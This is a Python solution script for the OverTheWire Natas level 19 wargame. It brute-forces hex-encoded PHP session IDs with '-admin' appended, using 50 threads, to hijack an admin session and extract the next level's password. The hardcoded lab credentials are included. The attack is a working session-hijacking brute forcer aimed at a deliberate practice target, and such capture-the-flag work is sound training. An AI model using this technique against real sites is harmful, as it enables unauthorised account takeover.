import requests
from concurrent.futures import ThreadPoolExecutor

username = "natas19"
password = "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"
base_url = "http://natas19.natas.labs.overthewire.org/index.php?debug=1"

print("Brute forcing session ID...")
def check_session_id(session_id):
    numberAsHex = "".join(hex(ord(c))[2:] for c in str(session_id))
    adminStr = "2d61646d696e"
    phpsessid = numberAsHex + adminStr
    r = requests.post(base_url, auth=(username, password), headers={"Cookie": "PHPSESSID=" + phpsessid})
    if "You are logged in as a regular user" not in r.text:
        return session_id, r.text
    return None

def main():
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(check_session_id, i) for i in range(640)]
        for future in futures:
            result = future.result()
            if result:
                executor.shutdown(wait=False, cancel_futures=True)
                session_id, output = result
                pass_index = output.rfind("Password: ") + len("Password: ") 
                print(f"Session ID founded!: {session_id}\n")
                print("########## DATA ##########\n")
                print("Username: natas20")
                print("Password: "+output[pass_index:pass_index+32])
                break


if __name__ == "__main__":
    main()